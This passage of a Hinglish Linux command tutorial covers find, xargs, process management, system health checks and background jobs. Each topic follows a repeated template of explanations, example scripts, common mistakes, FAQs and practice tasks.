
# Find empty files and directories
find_empty() {
    local dir=${1:-.}
    
    echo "=== Empty Files ==="
    find "$dir" -type f -empty
    
    echo ""
    echo "=== Empty Directories ==="
    find "$dir" -type d -empty
}

# Find files by extension and process
process_by_extension() {
    local dir=$1
    local ext=$2
    local action=$3
    
    echo "Processing *.$ext files in $dir..."
    
    find "$dir" -name "*.$ext" -type f | while read file; do
        case $action in
            count)
                wc -l "$file"
                ;;
            compress)
                gzip "$file"
                ;;
            move)
                mv "$file" /backup/
                ;;
        esac
    done
}

# Security audit
security_audit() {
    local dir=${1:-/}
    
    echo "=== Security Audit ==="
    
    # SUID files
    echo "SUID files:"
    find "$dir" -type f -perm -4000 -ls 2>/dev/null | head -20
    
    # World-writable files
    echo ""
    echo "World-writable files:"
    find "$dir" -type f -perm -002 ! -type l -ls 2>/dev/null | head -20
    
    # Files without owner
    echo ""
    echo "Files without owner:"
    find "$dir" -nouser -ls 2>/dev/null | head -20
}

# Backup recent changes
backup_recent() {
    local source=$1
    local backup_dir=$2
    local days=${3:-1}
    
    echo "Backing up files modified in last $days days..."
    
    find "$source" -type f -mtime -$days -exec cp --parents {} "$backup_dir" \;
    
    echo "✓ Backup complete"
}

# Find and replace in files
find_and_replace() {
    local dir=$1
    local pattern=$2
    local replacement=$3
    local ext=$4
    
    echo "Finding and replacing in *.$ext files..."
    
    find "$dir" -name "*.$ext" -type f -exec sed -i "s/$pattern/$replacement/g" {} \;
    
    echo "✓ Replacement complete"
}

# Organize files by date
organize_by_date() {
    local source=$1
    local dest=$2
    
    echo "Organizing files by date..."
    
    find "$source" -type f | while read file; do
        local date=$(stat -c %y "$file" | cut -d' ' -f1)
        local year=$(echo $date | cut -d'-' -f1)
        local month=$(echo $date | cut -d'-' -f2)
        
        mkdir -p "$dest/$year/$month"
        mv "$file" "$dest/$year/$month/"
    done
    
    echo "✓ Files organized"
}

# Find broken symlinks
find_broken_links() {
    local dir=${1:-.}
    
    echo "=== Broken Symbolic Links ==="
    
    find "$dir" -type l ! -exec test -e {} \; -print
}

# Disk usage by file type
disk_usage_by_type() {
    local dir=${1:-.}
    
    echo "=== Disk Usage by File Type ==="
    
    for ext in txt log jpg png pdf; do
        local size=$(find "$dir" -name "*.$ext" -type f -exec du -ch {} + 2>/dev/null | \
            tail -1 | cut -f1)
        echo "$ext: $size"
    done
}

main() {
    local action=${1:-help}
    
    case $action in
        clean)
            clean_old_logs "$2" "$3"
            ;;
        large)
            find_large_files "$2" "$3"
            ;;
        audit)
            security_audit "$2"
            ;;
        empty)
            find_empty "$2"
            ;;
        *)
            echo "Usage: $0 {clean|large|audit|empty} [args]"
            ;;
    esac
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`-exec` syntax galat:** `{} \;` zaroori hai
- ❌ **Path specify nahi karna:** Current directory default
- ❌ **Quotes bhoolna:** Wildcards ke liye quotes

### 10. **Best Practices / Pro Tips**
- 💡 **`-print` for testing:** Pehle dekho kya milega
- 💡 **`-maxdepth`:** Depth limit karo
- 💡 **Combine conditions:** Multiple criteria use karo
- 💡 **`xargs` for efficiency:** Better than `-exec`

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# System cleanup automation

cleanup_system() {
    echo "=== System Cleanup ==="
    
    # Remove old temp files
    find /tmp -type f -mtime +7 -delete
    
    # Remove old logs
    find /var/log -name "*.log" -mtime +30 -exec gzip {} \;
    
    # Remove empty directories
    find /tmp -type d -empty -delete
    
    # Clean package cache
    find /var/cache/apt -name "*.deb" -mtime +30 -delete
    
    echo "✓ Cleanup complete"
}

cleanup_system
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `-name` search by name
- ✅ `-type` file type
- ✅ `-size` file size
- ✅ `-mtime` modification time
- ✅ `-exec` run commands

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `-exec` kaise kaam karta hai?**
A: `{}` found file ko represent karta hai, `\;` command end.

**Q2: `-mtime -7` ka matlab?**
A: Last 7 days mein modified.

**Q3: find slow hai, kaise fast karu?**
A: `-maxdepth` use karo, specific path do.

### 14. **Practice ke liye Task**

```bash
# 1. Find by name
find . -name "*.txt"

# 2. Find large files
find /var -size +100M

# 3. Find old files
find /tmp -mtime +30

# 4. Find and delete
find . -name "*.tmp" -delete

# 5. Find and execute
find . -name "*.sh" -exec chmod +x {} \;

# 6. Combine conditions
find . -name "*.log" -size +10M -mtime +7
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔍 find searches files powerfully
- 📁 `-name`, `-type`, `-size` filters
- ⏰ `-mtime` for time-based
- ⚡ `-exec` runs commands
- 🎯 Essential for automation

> **💡 Ye Zaroor Yaad Rakhein:**
> find system administration ka powerhouse! `-name` for names, `-size` for size, `-mtime` for time. `-exec` se commands run karo. Pehle `-print` se test karo!

---

## **Topic 4: `xargs` (Piping from `find`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**xargs** - Command arguments build karne aur execute karne ka tool.

### 2. **Ye Kya Hai? (What is it?)**
`xargs` stdin se input leta hai aur use command arguments mein convert karta hai. `find` ke saath perfect combination - found files par efficiently commands execute karta hai. `-exec` se zyada fast.

**Analogy:** xargs ek assembly line hai jo items ko batches mein process karta hai - efficient aur fast.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Efficiency** - Bulk operations fast
- ✅ **Flexibility** - Any command use karo
- ✅ **Performance** - Better than `-exec`
- ✅ **Parallel processing** - `-P` option

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Bulk file operations
- Pipeline processing
- Performance-critical tasks
- Parallel execution

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Slow operations
- Inefficient scripts
- Resource waste
- Limited automation

### 6. **Syntax aur Common Options**

```bash
# Basic usage
find . -name "*.txt" | xargs rm
echo "file1 file2 file3" | xargs ls -l

# Options
xargs -n 1          # One argument at a time
xargs -I {}         # Replace string
xargs -P 4          # Parallel (4 processes)
xargs -t            # Print command before executing
xargs -p            # Prompt before executing
xargs -0            # Null-separated input
```

### 7. **Example 1 (Basic)**

```bash
# Delete files found by find
find . -name "*.tmp" | xargs rm

# Change permissions
find . -name "*.sh" | xargs chmod +x

# Count lines in multiple files
find . -name "*.txt" | xargs wc -l

# One at a time
echo "file1 file2 file3" | xargs -n 1 ls -l

# Replace string
find . -name "*.txt" | xargs -I {} cp {} /backup/

# Parallel execution
find . -name "*.jpg" | xargs -P 4 -I {} convert {} {}.png

# With null separator (safe for spaces)
find . -name "*.txt" -print0 | xargs -0 rm

# Print before executing
find . -name "*.log" | xargs -t gzip

# Prompt before executing
find . -name "*.bak" | xargs -p rm
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Advanced xargs usage

set -euo pipefail

# Parallel image processing
process_images() {
    local dir=$1
    local cores=$(nproc)
    
    echo "Processing images with $cores cores..."
    
    find "$dir" -name "*.jpg" -print0 | \
        xargs -0 -P "$cores" -I {} \
        convert {} -resize 800x600 {}.resized.jpg
    
    echo "✓ Images processed"
}

# Backup multiple files
backup_files() {
    local source=$1
    local dest=$2
    
    find "$source" -name "*.conf" -print0 | \
        xargs -0 -I {} cp {} "$dest/"
    
    echo "✓ Files backed up"
}

# Compress logs in parallel
compress_logs() {
    local log_dir=$1
    
    find "$log_dir" -name "*.log" -mtime +7 -print0 | \
        xargs -0 -P 4 gzip
    
    echo "✓ Logs compressed"
}

# Search in multiple files
search_in_files() {
    local pattern=$1
    local dir=$2
    
    find "$dir" -name "*.txt" -print0 | \
        xargs -0 grep -l "$pattern"
}

# Delete empty files
delete_empty() {
    local dir=$1
    
    find "$dir" -type f -empty -print0 | \
        xargs -0 -p rm
}

# Download URLs from file
download_urls() {
    local url_file=$1
    
    cat "$url_file" | xargs -n 1 -P 4 wget -q
    
    echo "✓ Downloads complete"
}

# Process CSV files
process_csv() {
    local dir=$1
    
    find "$dir" -name "*.csv" -print0 | \
        xargs -0 -I {} sh -c 'echo "Processing {}"; wc -l {}'
}

# Create thumbnails
create_thumbnails() {
    local dir=$1
    
    find "$dir" -name "*.png" -print0 | \
        xargs -0 -P 8 -I {} \
        convert {} -thumbnail 150x150 {}_thumb.png
}

main() {
    local action=${1:-help}
    
    case $action in
        images)
            process_images "$2"
            ;;
        backup)
            backup_files "$2" "$3"
            ;;
        compress)
            compress_logs "$2"
            ;;
        *)
            echo "Usage: $0 {images|backup|compress} [args]"
            ;;
    esac
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Spaces in filenames:** `-print0` aur `-0` use karo
- ❌ **Too many arguments:** System limits exceed
- ❌ **No error handling:** Commands fail silently

### 10. **Best Practices / Pro Tips**
- 💡 **`-print0` with `-0`:** Spaces handle karne ke liye
- 💡 **`-P` for parallel:** Multi-core utilize karo
- 💡 **`-I {}` for flexibility:** Complex commands ke liye
- 💡 **Test with `-t`:** Pehle dekho kya execute hoga

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Parallel log processing

process_logs() {
    local log_dir="/var/log/app"
    local cores=$(nproc)
    
    echo "Processing logs with $cores cores..."
    
    # Find and compress old logs in parallel
    find "$log_dir" -name "*.log" -mtime +7 -print0 | \
        xargs -0 -P "$cores" gzip
    
    # Extract errors from all logs
    find "$log_dir" -name "*.log.gz" -print0 | \
        xargs -0 -P "$cores" -I {} \
        sh -c 'zgrep "ERROR" {} > {}.errors'
    
    echo "✓ Log processing complete"
}

process_logs
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ xargs builds command arguments
- ✅ `-P` for parallel execution
- ✅ `-I {}` for replacement
- ✅ `-0` with `-print0` for spaces
- ✅ Faster than `-exec`

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: xargs vs find -exec?**
A: xargs faster hai, batches mein process karta hai.

**Q2: Spaces in filenames kaise handle karu?**
A: `-print0` aur `-0` use karo.

**Q3: Parallel execution kaise?**
A: `-P` option use karo: `xargs -P 4`

### 14. **Practice ke liye Task**

```bash
# 1. Basic
find . -name "*.txt" | xargs wc -l

# 2. Delete
find . -name "*.tmp" | xargs rm

# 3. Parallel
find . -name "*.jpg" | xargs -P 4 -I {} echo {}

# 4. Safe with spaces
find . -name "*.txt" -print0 | xargs -0 ls -l

# 5. Replace string
find . -name "*.log" | xargs -I {} cp {} /backup/

# 6. One at a time
echo "a b c" | xargs -n 1 echo
```

### 15. **Aakhri Choti Summary (5 lines)**
- ⚡ xargs for bulk operations
- 🚀 `-P` parallel processing
- 🔄 `-I {}` replacement
- 📁 `-0` handles spaces
- 💪 Faster than `-exec`

> **💡 Ye Zaroor Yaad Rakhein:**
> xargs efficiency ka tool! find ke saath perfect. `-P` parallel ke liye, `-0` spaces ke liye. `-I {}` flexibility ke liye. Production mein bahut useful!

---

## **Topic 5: Process Management (`ps aux`, `pgrep`, `pkill`, `kill`, `kill -9`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Process Management** - Running processes ko monitor aur control karna.

### 2. **Ye Kya Hai? (What is it?)**
Process management commands running programs ko list, search, aur terminate karte hain. `ps` processes show karta hai, `pgrep` search karta hai, `kill` terminate karta hai. System administration ka core skill.

**Analogy:** Process management ek task manager hai - kaun kya kar raha hai dekho aur zaroorat par band karo.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **System monitoring** - Resource usage dekho
- ✅ **Troubleshooting** - Hung processes fix
- ✅ **Resource management** - CPU/memory control
- ✅ **Security** - Suspicious processes identify

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- System slow hai
- Process hang ho gayi
- Resource monitoring
- Security checks

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Hung processes
- Resource exhaustion
- System crashes
- Security issues

### 6. **Syntax aur Common Options**

```bash
# List processes
ps aux                  # All processes
ps -ef                  # Full format
ps -u username          # User's processes

# Search processes
pgrep nginx             # Find by name
pgrep -u user           # By user
pgrep -l nginx          # With name

# Kill processes
kill PID                # Graceful (SIGTERM)
kill -9 PID             # Force (SIGKILL)
kill -15 PID            # Terminate (default)
pkill nginx             # Kill by name
killall nginx           # Kill all instances

# Signals
kill -l                 # List all signals
kill -HUP PID           # Reload config
kill -STOP PID          # Pause
kill -CONT PID          # Resume
```

### 7. **Example 1 (Basic)**

```bash
# List all processes
ps aux

# Find specific process
ps aux | grep nginx

# Search by name
pgrep nginx
pgrep -l apache2        # With name

# Kill process
kill 1234               # By PID
kill -9 1234            # Force kill

# Kill by name
pkill nginx
killall firefox

# User's processes
ps -u john
pgrep -u john

# Process tree
pstree
pstree -p               # With PIDs

# Top processes
ps aux --sort=-%cpu | head -10
ps aux --sort=-%mem | head -10
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Process management automation

set -euo pipefail

# Monitor process
monitor_process() {
    local process_name=$1
    
    if pgrep -x "$process_name" > /dev/null; then
        echo "✓ $process_name is running"
        
        # Show details
        ps aux | grep "$process_name" | grep -v grep
    else
        echo "✗ $process_name is not running"
        return 1
    fi
}

# Kill hung process
kill_hung_process() {
    local process_name=$1
    
    echo "Checking for hung $process_name..."
    
    local pids=$(pgrep "$process_name")
    
    if [ -z "$pids" ]; then
        echo "No $process_name processes found"
        return 0
    fi
    
    for pid in $pids; do
        # Try graceful kill first
        echo "Attempting graceful kill of PID $pid..."
        kill "$pid"
        
        # Wait 5 seconds
        sleep 5
        
        # Check if still running
        if ps -p "$pid" > /dev/null 2>&1; then
            echo "Process still running, force killing..."
            kill -9 "$pid"
        fi
        
        echo "✓ Process $pid terminated"
    done
}

# Restart service
restart_service() {
    local service=$1
    
    echo "Restarting $service..."
    
    # Kill existing
    pkill -9 "$service" 2>/dev/null || true
    
    # Wait
    sleep 2
    
    # Start new
    systemctl start "$service"
    
    echo "✓ $service restarted"
}

# Monitor resource usage
monitor_resources() {
    echo "=== Top CPU Consumers ==="
    ps aux --sort=-%cpu | head -11 | tail -10
    
    echo ""
    echo "=== Top Memory Consumers ==="
    ps aux --sort=-%mem | head -11 | tail -10
}

# Kill processes by user
kill_user_processes() {
    local username=$1
    
    echo "Killing all processes for user: $username"
    
    pkill -u "$username"
    
    echo "✓ Processes killed"
}

# Find zombie processes
find_zombies() {
    echo "=== Zombie Processes ==="
    
    ps aux | awk '$8=="Z" {print $0}'
}

# Process health check
health_check() {
    local services=("nginx" "mysql" "redis")
    
    echo "=== Service Health Check ==="
    
    for service in "${services[@]}"; do
        if pgrep -x "$service" > /dev/null; then
            local pid=$(pgrep -x "$service" | head -1)
            local cpu=$(ps -p "$pid" -o %cpu= | tr -d ' ')
            local mem=$(ps -p "$pid" -o %mem= | tr -d ' ')
            
            echo "✓ $service: PID=$pid CPU=$cpu% MEM=$mem%"
        else
            echo "✗ $service: NOT RUNNING"
        fi
    done
}

# Kill high CPU processes
kill_high_cpu() {
    local threshold=${1:-90}
    
    echo "Killing processes using >$threshold% CPU..."
    
    ps aux --sort=-%cpu | awk -v t="$threshold" '$3>t {print $2}' | \
        while read pid; do
            echo "Killing PID $pid (high CPU)"
            kill -9 "$pid"
        done
}

# Process watchdog
watchdog() {
    local process=$1
    local max_restarts=3
    local restart_count=0
    
    while true; do
        if ! pgrep -x "$process" > /dev/null; then
            echo "⚠️  $process not running!"
            
            if [ $restart_count -lt $max_restarts ]; then
                echo "Restarting $process (attempt $((restart_count+1)))"
                systemctl start "$process"
                ((restart_count++))
            else
                echo "✗ Max restarts reached, alerting..."
                # Send alert
                break
            fi
        else
            restart_count=0
        fi
        
        sleep 60
    done
}

main() {
    local action=${1:-help}
    
    case $action in
        monitor)
            monitor_process "$2"
            ;;
        kill)
            kill_hung_process "$2"
            ;;
        health)
            health_check
            ;;
        resources)
            monitor_resources
            ;;
        *)
            echo "Usage: $0 {monitor|kill|health|resources} [process]"
            ;;
    esac
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`kill -9` pehle use karna:** Graceful kill pehle try karo
- ❌ **Wrong PID:** Double-check karo
- ❌ **Root processes:** Carefully handle karo

### 10. **Best Practices / Pro Tips**
- 💡 **Graceful first:** `kill` pehle, `-9` last resort
- 💡 **`pgrep` better:** `ps | grep` se better
- 💡 **Check before kill:** Process verify karo
- 💡 **Use systemctl:** Services ke liye better

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Application health monitor

monitor_app() {
    local app="myapp"
    
    while true; do
        if ! pgrep -x "$app" > /dev/null; then
            echo "[$(date)] ⚠️  $app crashed!"
            
            # Restart
            systemctl start "$app"
            
            # Alert
            echo "$app restarted" | mail -s "App Restart" admin@example.com
        else
            # Check resource usage
            local pid=$(pgrep -x "$app")
            local cpu=$(ps -p "$pid" -o %cpu= | tr -d ' ')
            local mem=$(ps -p "$pid" -o %mem= | tr -d ' ')
            
            echo "[$(date)] $app: CPU=$cpu% MEM=$mem%"
            
            # Alert if high
            if (( $(echo "$cpu > 80" | bc -l) )); then
                echo "High CPU usage: $cpu%" | \
                    mail -s "High CPU Alert" admin@example.com
            fi
        fi
        
        sleep 60
    done
}

monitor_app
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `ps aux` list processes
- ✅ `pgrep` search by name
- ✅ `kill` terminate gracefully
- ✅ `kill -9` force kill
- ✅ `pkill` kill by name

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `kill` vs `kill -9`?**
A: `kill` graceful (cleanup), `-9` force (immediate).

**Q2: Process PID kaise find karu?**
A: `pgrep process_name` ya `ps aux | grep process`

**Q3: Zombie process kya hai?**
A: Dead process jo cleanup nahi hui.

### 14. **Practice ke liye Task**

```bash
# 1. List processes
ps aux

# 2. Find process
pgrep nginx

# 3. Kill process
kill 1234

# 4. Force kill
kill -9 1234

# 5. Kill by name
pkill firefox

# 6. User processes
ps -u username
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📊 ps lists processes
- 🔍 pgrep searches by name
- 🛑 kill terminates processes
- ⚡ kill -9 force kills
- 🎯 Essential for system admin

> **💡 Ye Zaroor Yaad Rakhein:**
> Process management critical skill! `ps aux` for listing, `pgrep` for searching, `kill` gracefully pehle. `-9` last resort. Production mein carefully use karo!

---

## **Topic 6: System Health Check (`df -h`, `free -m`, `uptime`, `ss -tulpn`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**System Health** - System resources aur status monitor karna.

### 2. **Ye Kya Hai? (What is it?)**
System health commands disk space (`df`), memory (`free`), uptime, aur network connections (`ss`) check karte hain. Regular monitoring se problems early detect ho jati hain.

**Analogy:** System health check ek medical checkup hai - vitals check karo problems se pehle.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Proactive monitoring** - Problems pehle pakdo
- ✅ **Resource planning** - Capacity planning
- ✅ **Performance** - Bottlenecks identify
- ✅ **Troubleshooting** - Issues diagnose

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Daily monitoring
- Performance issues
- Before deployments
- Capacity planning

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Disk full surprises
- Out of memory crashes
- Network issues
- Downtime

### 6. **Syntax aur Common Options**

```bash
# Disk space
df -h                   # Human-readable
df -i                   # Inodes
df -T                   # Filesystem type

# Memory
free -h                 # Human-readable
free -m                 # Megabytes
free -g                 # Gigabytes

# Uptime & load
uptime                  # System uptime
w                       # Who is logged in
top                     # Real-time monitoring
htop                    # Better top

# Network
ss -tulpn               # All listening ports
ss -tan                 # TCP connections
netstat -tulpn          # Alternative (older)
```

### 7. **Example 1 (Basic)**

```bash
# Disk space
df -h
# Output: Filesystem, Size, Used, Avail, Use%, Mounted on

# Specific filesystem
df -h /home

# Inodes
df -i

# Memory usage
free -h
# Output: total, used, free, shared, buff/cache, available

# Uptime
uptime
# Output: 10:30:45 up 5 days, 3:20, 2 users, load average: 0.5, 0.3, 0.2

# Load average (1, 5, 15 minutes)
cat /proc/loadavg

# Network connections
ss -tulpn
# t=TCP, u=UDP, l=listening, p=process, n=numeric

# Active connections
ss -tan | wc -l

# Listening ports
ss -tulpn | grep LISTEN
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Comprehensive system health check

set -euo pipefail

readonly ALERT_EMAIL="admin@example.com"
readonly DISK_THRESHOLD=80
readonly MEM_THRESHOLD=90
readonly LOAD_THRESHOLD=4

# Check disk space
check_disk() {
    echo "=== Disk Space ==="
    
    df -h | grep -v tmpfs | while read line; do
        usage=$(echo "$line" | awk '{print $5}' | sed 's/%//')
        
        if [ "$usage" -gt "$DISK_THRESHOLD" ] 2>/dev/null; then
            echo "⚠️  $line"
            echo "High disk usage: $line" | \
                mail -s "Disk Alert" "$ALERT_EMAIL"
        else
            echo "✓ $line"
        fi
    done
}

# Check memory
check_memory() {
    echo "=== Memory Usage ==="
    
    free -h
    
    local mem_used=$(free | awk 'NR==2{printf "%.0f", $3/$2*100}')
    
    echo "Memory used: $mem_used%"
    
    if [ "$mem_used" -gt "$MEM_THRESHOLD" ]; then
        echo "⚠️  High memory usage!"
        echo "Memory usage: $mem_used%" | \
            mail -s "Memory Alert" "$ALERT_EMAIL"
    fi
}

# Check load average
check_load() {
    echo "=== System Load ==="
    
    uptime
    
    local load=$(uptime | awk -F'load average:' '{print $2}' | awk '{print $1}' | sed 's/,//')
    local cores=$(nproc)
    
    echo "Load: $load, Cores: $cores"
    
    if (( $(echo "$load > $cores" | bc -l) )); then
        echo "⚠️  High load average!"
    fi
}

# Check network
check_network() {
    echo "=== Network Status ==="
    
    # Listening ports
    echo "Listening ports:"
    ss -tulpn | grep LISTEN
    
    # Connection count
    local conn_count=$(ss -tan | grep ESTAB | wc -l)
    echo "Active connections: $conn_count"
    
    # Check specific ports
    for port in 80 443 22 3306; do
        if ss -tulpn | grep -q ":$port "; then
            echo "✓ Port $port is listening"
        else
            echo "✗ Port $port is NOT listening"
        fi
    done
}

# Check services
check_services() {
    echo "=== Service Status ==="
    
    local services=("nginx" "mysql" "redis")
    
    for service in "${services[@]}"; do
        if systemctl is-active --quiet "$service"; then
            echo "✓ $service is running"
        else
            echo "✗ $service is NOT running"
            systemctl start "$service" || true
        fi
    done
}

# Check CPU
check_cpu() {
    echo "=== CPU Usage ==="
    
    # Top CPU consumers
    ps aux --sort=-%cpu | head -6
    
    # CPU info
    echo ""
    echo "CPU cores: $(nproc)"
    echo "CPU model: $(lscpu | grep 'Model name' | cut -d: -f2 | xargs)"
}

# Check disk I/O
check_io() {
    echo "=== Disk I/O ==="
    
    if command -v iostat >/dev/null; then
        iostat -x 1 2 | tail -n +4
    else
        echo "iostat not installed"
    fi
}

# Generate report
generate_report() {
    local report="/tmp/health_report_$(date +%Y%m%d_%H%M%S).txt"
    
    {
        echo "=== System Health Report ==="
        echo "Generated: $(date)"
        echo "Hostname: $(hostname)"
        echo ""
        
        check_disk
        echo ""
        
        check_memory
        echo ""
        
        check_load
        echo ""
        
        check_network
        echo ""
        
        check_services
        echo ""
        
        check_cpu
    } > "$report"
    
    cat "$report"
    echo ""
    echo "Report saved: $report"
}

# Quick status
quick_status() {
    echo "=== Quick Status ==="
    echo "Uptime: $(uptime -p)"
    echo "Load: $(uptime | awk -F'load average:' '{print $2}')"
    echo "Disk: $(df -h / | tail -1 | awk '{print $5}')"
    echo "Memory: $(free | awk 'NR==2{printf "%.0f%%", $3/$2*100}')"
    echo "Connections: $(ss -tan | grep ESTAB | wc -l)"
}

main() {
    local action=${1:-full}
    
    case $action in
        disk)
            check_disk
            ;;
        memory)
            check_memory
            ;;
        network)
            check_network
            ;;
        quick)
            quick_status
            ;;
        full)
            generate_report
            ;;
        *)
            echo "Usage: $0 {disk|memory|network|quick|full}"
            ;;
    esac
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Thresholds ignore karna:** Alerts set karo
- ❌ **Inodes bhoolna:** Disk space hai but inodes full
- ❌ **Load average misunderstand:** Cores se compare karo

### 10. **Best Practices / Pro Tips**
- 💡 **Regular monitoring:** Cron job setup karo
- 💡 **Set thresholds:** 80% disk, 90% memory
- 💡 **Check inodes:** `df -i` regularly
- 💡 **Monitor trends:** Historical data track karo

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Production health monitor

monitor_production() {
    while true; do
        # Disk check
        local disk_usage=$(df -h / | tail -1 | awk '{print $5}' | sed 's/%//')
        
        if [ "$disk_usage" -gt 85 ]; then
            echo "[$(date)] ⚠️  Disk usage: $disk_usage%"
            # Cleanup
            find /var/log -name "*.log" -mtime +7 -delete
        fi
        
        # Memory check
        local mem_usage=$(free | awk 'NR==2{printf "%.0f", $3/$2*100}')
        
        if [ "$mem_usage" -gt 90 ]; then
            echo "[$(date)] ⚠️  Memory usage: $mem_usage%"
            # Clear cache
            sync; echo 3 > /proc/sys/vm/drop_caches
        fi
        
        # Load check
        local load=$(uptime | awk -F'load average:' '{print $2}' | awk '{print $1}' | sed 's/,//')
        echo "[$(date)] Load: $load, Disk: $disk_usage%, Memory: $mem_usage%"
        
        sleep 300  # 5 minutes
    done
}

monitor_production
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `df -h` disk space
- ✅ `free -h` memory usage
- ✅ `uptime` system uptime
- ✅ `ss -tulpn` network ports
- ✅ Regular monitoring essential

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Load average kya hai?**
A: Average number of processes waiting for CPU. Cores se compare karo.

**Q2: Disk full ho gayi toh?**
A: Old logs delete karo, `/tmp` clean karo.

**Q3: `ss` vs `netstat`?**
A: `ss` faster aur modern, `netstat` deprecated.

### 14. **Practice ke liye Task**

```bash
# 1. Disk space
df -h

# 2. Memory
free -h

# 3. Uptime
uptime

# 4. Network ports
ss -tulpn

# 5. Quick check
df -h && free -h && uptime

# 6. Monitor
watch -n 5 'df -h && free -h'
```

### 15. **Aakhri Choti Summary (5 lines)**
- 💾 df checks disk space
- 🧠 free checks memory
- ⏰ uptime shows system uptime
- 🌐 ss shows network connections
- 📊 Regular monitoring critical

> **💡 Ye Zaroor Yaad Rakhein:**
> System health daily check karo! df disk ke liye, free memory ke liye, uptime load ke liye. Thresholds set karo. Proactive monitoring problems prevent karta hai!

---

## **Topic 7: Background Jobs (`&`, `Ctrl+Z`, `jobs`, `fg`, `bg`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Background Jobs** - Processes ko background mein run karna.

### 2. **Ye Kya Hai? (What is it?)**
Background jobs commands ko background mein execute karte hain, terminal free rehta hai. `&` se start karo, `Ctrl+Z` se pause, `jobs` list dekho, `fg` foreground mein lao, `bg` background mein resume.

**Analogy:** Background jobs multitasking hai - ek kaam background mein chalta hai jab aap doosra kaam karte hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Multitasking** - Multiple tasks simultaneously
- ✅ **Long-running tasks** - Terminal free rakho
- ✅ **Flexibility** - Jobs control karo
- ✅ **Productivity** - Efficient workflow

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Long-running scripts
- Multiple tasks
- Server processes
- Development workflow

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Terminal blocked
- Inefficient workflow
- Lost productivity
- Process management issues

### 6. **Syntax aur Common Options**

```bash
# Start in background
command &

# Pause current job
Ctrl+Z

# List jobs
jobs
jobs -l                 # With PIDs

# Foreground
fg                      # Last job
fg %1                   # Job 1

# Background
bg                      # Last job
bg %1                   # Job 1

# Kill job
kill %1
```

### 7. **Example 1 (Basic)**

```bash
# Run in background
sleep 100 &
# Output: [1] 12345

# Multiple background jobs
sleep 50 &
sleep 60 &
sleep 70 &

# List jobs
jobs
# Output:
# [1]   Running    sleep 50 &
# [2]-  Running    sleep 60 &
# [3]+  Running    sleep 70 &

# Pause current job
# Press Ctrl+Z
# Output: [1]+ Stopped    sleep 100

# Resume in background
bg %1

# Bring to foreground
fg %1

# Kill background job
kill %1

# Run and detach
nohup long_script.sh &

# Disown job
command &
disown
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Background job management

set -euo pipefail

# Run multiple tasks in parallel
parallel_tasks() {
    echo "Starting parallel tasks..."
    
    # Task 1
    (
        echo "Task 1 started"
        sleep 5
        echo "Task 1 completed"
    ) &
    
    # Task 2
    (
        echo "Task 2 started"
        sleep 3
        echo "Task 2 completed"
    ) &
    
    # Task 3
    (
        echo "Task 3 started"
        sleep 4
        echo "Task 3 completed"
    ) &
    
    # Wait for all
    wait
    
    echo "All tasks completed"
}

# Background processing with monitoring
background_with_monitor() {
    local script=$1
    
    # Start in background
    "$script" &
    local pid=$!
    
    echo "Started $script with PID $pid"
    
    # Monitor
    while kill -0 "$pid" 2>/dev/null; do
        echo "Still running..."
        sleep 5
    done
    
    echo "Process completed"
}

# Parallel file processing
process_files_parallel() {
    local dir=$1
    
    for file in "$dir"/*.txt; do
        (
            echo "Processing $file..."
            # Process file
            wc -l "$file"
        ) &
    done
    
    wait
    echo "All files processed"
}

# Background job with timeout
run_with_timeout() {
    local command=$1
    local timeout=$2
    
    # Start in background
    $command &
    local pid=$!
    
    # Wait with timeout
    local count=0
    while kill -0 "$pid" 2>/dev/null; do
        if [ $count -ge $timeout ]; then
            echo "Timeout reached, killing process"
            kill -9 "$pid"
            return 1
        fi
        
        sleep 1
        ((count++))
    done
    
    echo "Command completed"
}

# Job queue
job_queue() {
    local max_jobs=3
    
    for i in {1..10}; do
        # Wait if too many jobs
        while [ $(jobs -r | wc -l) -ge $max_jobs ]; do
            sleep 1
        done
        
        # Start new job
        (
